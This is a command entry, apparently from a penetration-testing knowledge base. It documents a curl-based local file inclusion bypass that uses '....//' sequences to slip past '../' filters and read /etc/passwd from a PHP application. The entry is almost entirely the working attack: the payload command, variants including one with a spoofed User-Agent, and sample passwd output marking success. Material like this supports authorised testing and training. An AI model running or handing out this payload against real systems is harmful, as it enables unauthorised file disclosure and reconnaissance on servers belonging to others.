---
id: c3d98972-83ec-4eb3-9bf9-9aba2b74df0e
name: curl-lfi-bypass-double-dot
type: command
executor: bash
data: 'curl "http://example.com/index.php?page=....//....//etc/passwd"'
output: null
created_at: '2023-04-06T03:56:38.834404+00:00'
updated_at: '2023-04-10T20:23:28.896426+00:00'
platforms:
  - Linux
  - Web
tags:
  - lfi
  - directory-traversal
verified: true
validated: true
---

# curl-lfi-bypass-double-dot

## Command

```bash
curl "http://example.com/index.php?page=....//....//etc/passwd" -v
```

## Description

This command uses curl to test an LFI bypass payload with double dots (....//) to evade filters blocking standard '../' traversal, attempting to include and display /etc/passwd from the target PHP application.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `$_TARGET_URL` | Base URL of the vulnerable endpoint (replace example.com) | Yes |
| `$_FILE_PATH` | Target file path (e.g., /etc/passwd) | Yes |
| `-v` | Verbose mode to show headers and response details | No |

## Examples

### Basic Usage

```bash
curl "http://target.com/vuln.php?file=....//....//etc/passwd"
```

### With Headers and Silent Output

```bash
curl -s -H "User-Agent: Mozilla/5.0" "http://example.com/index.php?page=....//....//etc/passwd" > output.txt
```

## Expected Output

On success, the response body contains the file contents:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

HTTP status 200 with no errors; failure shows application error or empty/redirected content.

## Related

- [[procedures/Basic-LFI-Filter-Bypass-Using-Directory-Traversal]]
- [[commands/curl-lfi-bypass-multiple-slash]]
